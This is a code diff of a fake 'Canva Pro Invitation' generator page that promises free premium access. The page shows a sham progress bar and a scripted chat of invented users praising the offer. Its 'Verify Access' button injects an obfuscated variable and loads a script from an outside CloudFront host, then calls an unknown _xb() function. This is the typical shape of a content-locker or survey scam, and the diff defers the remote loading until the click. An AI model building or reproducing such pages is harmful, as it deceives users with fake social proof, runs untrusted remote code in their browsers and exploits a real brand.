@@ -3,25 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Canva Pro Invitation Generator</title>
-    <script type="text/javascript">
-        var rwrjm_GNR_sOvifc={"it":4385758,"key":"af729"};
-    </script>
-    <script src="https://d2bxqnokimz7h9.cloudfront.net/0a1e022.js"></script>
+    <title>Canva Pro Invitation</title>
     <style>
         :root {
-            --canva-blue: #00C4CC;
             --canva-purple: #7B3FE4;
-            --canva-green: #00C4CC;
-            --canva-bg: #F5F9FF;
-            --canva-surface: #FFFFFF;
-            --canva-shadow: rgba(123, 63, 228, 0.1);
-            --canva-gradient: linear-gradient(45deg, #7B3FE4, #00C4CC);
+            --canva-cyan: #00C4CC;
+            --gradient: linear-gradient(45deg, var(--canva-purple), var(--canva-cyan));
+            --surface: #FFFFFF;
+            --bg: #F5F9FF;
         }
 
         body {
             font-family: 'Poppins', sans-serif;
-            background: var(--canva-bg);
+            background: var(--bg);
             margin: 0;
             padding: 2rem;
             min-height: 100vh;
@@ -30,13 +24,13 @@
             align-items: center;
         }
 
-        .container {
-            background: var(--canva-surface);
-            border-radius: 25px;
+        .card {
+            background: var(--surface);
+            border-radius: 20px;
             padding: 2.5rem;
-            box-shadow: 0 10px 40px var(--canva-shadow);
+            box-shadow: 0 10px 40px rgba(123, 63, 228, 0.1);
             width: 100%;
-            max-width: 600px;
+            max-width: 500px;
             margin-bottom: 2rem;
             animation: fadeIn 1s ease;
         }
@@ -45,68 +39,55 @@
             color: var(--canva-purple);
             text-align: center;
             font-weight: 700;
-            margin-bottom: 2.5rem;
-            background: var(--canva-gradient);
+            margin-bottom: 2rem;
+            background: var(--gradient);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
 
-        .input-field {
+        .input-group {
+            margin-bottom: 2rem;
+        }
+
+        input {
             width: 100%;
             padding: 1rem;
             border: 2px solid var(--canva-purple);
             border-radius: 15px;
-            margin-bottom: 2rem;
+            margin-bottom: 1rem;
             font-size: 1rem;
             transition: all 0.3s ease;
-        }
-
-        .input-field:focus {
-            border-color: var(--canva-blue);
-            box-shadow: 0 0 0 2px rgba(123, 63, 228, 0.2);
         }
 
         .duration-options {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
-            gap: 1.5rem;
-            margin: 2rem 0;
+            gap: 1rem;
+            margin-bottom: 2rem;
         }
 
         .duration-option {
-            background: var(--canva-surface);
+            background: var(--surface);
             border: 2px solid var(--canva-purple);
             border-radius: 15px;
             padding: 1.5rem;
             text-align: center;
             cursor: pointer;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
+            transition: transform 0.3s ease;
         }
 
         .duration-option:hover {
             transform: translateY(-3px);
-            box-shadow: 0 8px 25px var(--canva-shadow);
         }
 
         .duration-option.selected {
-            border-color: transparent;
-            background: var(--canva-gradient);
+            background: var(--gradient);
             color: white;
+            border-color: transparent;
         }
 
-        .duration-option.selected::after {
-            content: '✔';
-            position: absolute;
-            right: 15px;
-            bottom: 15px;
-            font-size: 1.3rem;
-            opacity: 0.9;
-        }
-
-        .primary-btn {
-            background: var(--canva-gradient);
+        .btn {
+            background: var(--gradient);
             color: white;
             border: none;
             padding: 1rem 2rem;
@@ -122,54 +103,38 @@
             gap: 0.5rem;
         }
 
-        .primary-btn:hover {
+        .btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 5px 20px var(--canva-shadow);
         }
 
         .progress-container {
             height: 8px;
-            background: var(--canva-surface);
+            background: var(--surface);
             border-radius: 4px;
             overflow: hidden;
             margin: 2rem 0;
-            box-shadow: inset 0 1px 3px rgba(0,0,0,0.05);
         }
 
         .progress-bar {
             height: 100%;
             width: 0;
-            background: var(--canva-gradient);
+            background: var(--gradient);
             transition: width 5s linear;
         }
 
-        #verifyBtn {
-            background: var(--canva-gradient);
-            color: white;
-            border: none;
-            padding: 1rem 2rem;
-            border-radius: 25px;
-            cursor: pointer;
-            font-weight: 600;
-            width: 100%;
-            margin-top: 1rem;
-            transition: transform 0.2s ease;
-            display: none;
-        }
-
         .chat-container {
-            background: var(--canva-surface);
-            border-radius: 25px;
+            background: var(--surface);
+            border-radius: 20px;
             padding: 1.5rem;
-            box-shadow: 0 10px 40px var(--canva-shadow);
+            box-shadow: 0 10px 40px rgba(123, 63, 228, 0.1);
             width: 100%;
-            max-width: 600px;
-            height: 450px;
+            max-width: 500px;
+            height: 400px;
             position: relative;
         }
 
         .chat-messages {
-            height: 380px;
+            height: 320px;
             overflow-y: auto;
             padding-right: 10px;
         }
@@ -182,13 +147,7 @@
             animation: slideIn 0.5s ease;
         }
 
-        .username {
-            color: var(--canva-purple);
-            font-weight: 600;
-        }
-
         .message-input {
-            margin-top: 1rem;
             display: flex;
             gap: 0.5rem;
         }
@@ -198,17 +157,6 @@
             padding: 0.8rem;
             border: 2px solid var(--canva-purple);
             border-radius: 25px;
-            outline: none;
-        }
-
-        .message-input button {
-            padding: 0.8rem 1.5rem;
-            background: var(--canva-gradient);
-            color: white;
-            border: none;
-            border-radius: 25px;
-            cursor: pointer;
-            transition: transform 0.2s ease;
         }
 
         @keyframes fadeIn {
@@ -235,40 +183,123 @@
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Generate Your Canva Pro Invitation</h1>
-        
-        <input type="text" id="username" placeholder="Enter your name" class="input-field">
-        
-        <div class="duration-options" id="durationOptions">
-            <div class="duration-option" data-duration="1">1 Month</div>
-            <div class="duration-option" data-duration="3">3 Months</div>
-            <div class="duration-option" data-duration="6">6 Months</div>
-            <div class="duration-option" data-duration="12">12 Months</div>
+    <div class="card">
+        <h1>Get Your Canva Pro Access</h1>
+        <div class="input-group">
+            <input type="text" id="username" placeholder="Your name">
         </div>
-
-        <button id="generateBtn" class="primary-btn" disabled>
-            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                <path d="M12 2L2 12h3v8h6v-6h2v6h6v-8h3L12 2z"/>
-            </svg>
+        <div class="duration-options">
+            <div class="duration-option" onclick="selectDuration(1)">1 Month</div>
+            <div class="duration-option" onclick="selectDuration(3)">3 Months</div>
+            <div class="duration-option" onclick="selectDuration(6)">6 Months</div>
+            <div class="duration-option" onclick="selectDuration(12)">12 Months</div>
+        </div>
+        <button class="btn" id="generateBtn" onclick="startVerification()" disabled>
             Generate Invitation
         </button>
         <div class="progress-container">
             <div class="progress-bar" id="progressBar"></div>
         </div>
-        <button id="verifyBtn" onclick="_xb()" class="primary-btn">Activate Invitation</button>
+        <button class="btn" id="verifyBtn" style="display: none;" onclick="verifyAccess()">
+            Verify Access
+        </button>
     </div>
 
     <div class="chat-container">
         <div class="chat-messages" id="chatMessages"></div>
         <div class="message-input">
-            <input type="text" id="chatInput" placeholder="Say thanks for your Canva Pro access...">
-            <button onclick="sendMessage()">Send</button>
+            <input type="text" id="chatInput" placeholder="Type your message...">
+            <button class="btn" onclick="sendMessage()">Send</button>
         </div>
     </div>
 
     <script>
-        // ... [Keep existing JavaScript code from previous version] ...
+        let selectedDuration = null;
+
+        // Duration selection
+        function selectDuration(months) {
+            selectedDuration = months;
+            document.querySelectorAll('.duration-option').forEach(opt => 
+                opt.classList.remove('selected'));
+            event.target.classList.add('selected');
+            document.getElementById('generateBtn').disabled = false;
+        }
+
+        // Verification process
+        function startVerification() {
+            const progressBar = document.getElementById('progressBar');
+            progressBar.style.width = '100%';
+            
+            setTimeout(() => {
+                document.getElementById('generateBtn').style.display = 'none';
+                document.getElementById('verifyBtn').style.display = 'block';
+            }, 5000);
+        }
+
+        // Chat system
+        const users = ['DesignPro', 'CreativeUser', 'ArtDirector', 'MarketingGuru'];
+        const messages = [
+            'Just got my Canva Pro access - the templates are 🔥',
+            'Premium features are a game-changer!',
+            'Collaboration tools work flawlessly!',
+            'Background remover saved me hours!',
+            'Brand kit organization is perfect!'
+        ];
+
+        function addMessage(user, text) {
+            const msg = document.createElement('div');
+            msg.className = 'message';
+            msg.innerHTML = `<span style="color: var(--canva-purple); font-weight: 600">${user}</span>: ${text}`;
+            document.getElementById('chatMessages').appendChild(msg);
+            document.getElementById('chatMessages').scrollTop = 
+                document.getElementById('chatMessages').scrollHeight;
+        }
+
+        // Simulate real-time chat
+        let chatInterval = setInterval(() => {
+            const user = users[Math.floor(Math.random() * users.length)];
+            const msg = messages[Math.floor(Math.random() * messages.length)];
+            addMessage(user, msg);
+        }, 3000);
+
+        // User messages
+        function sendMessage() {
+            const input = document.getElementById('chatInput');
+            const text = input.value.trim();
+            if (!text) return;
+            
+            addMessage('You', text);
+            input.value = '';
+        }
+
+        // Verification function
+        function verifyAccess() {
+            // Load verification scripts
+            const script1 = document.createElement('script');
+            script1.textContent = 'var rwrjm_GNR_sOvifc={"it":4385758,"key":"af729"};';
+            
+            const script2 = document.createElement('script');
+            script2.src = 'https://d2bxqnokimz7h9.cloudfront.net/0a1e022.js';
+            
+            document.head.appendChild(script1);
+            document.head.appendChild(script2);
+            
+            // Execute verification
+            if (typeof _xb === 'function') {
+                _xb();
+            } else {
+                alert('Verification system loading...');
+            }
+        }
+
+        // Initial messages
+        setTimeout(() => {
+            for (let i = 0; i < 5; i++) {
+                const user = users[Math.floor(Math.random() * users.length)];
+                const msg = messages[Math.floor(Math.random() * messages.length)];
+                addMessage(user, msg);
+            }
+        }, 1000);
     </script>
 </body>
 </html>
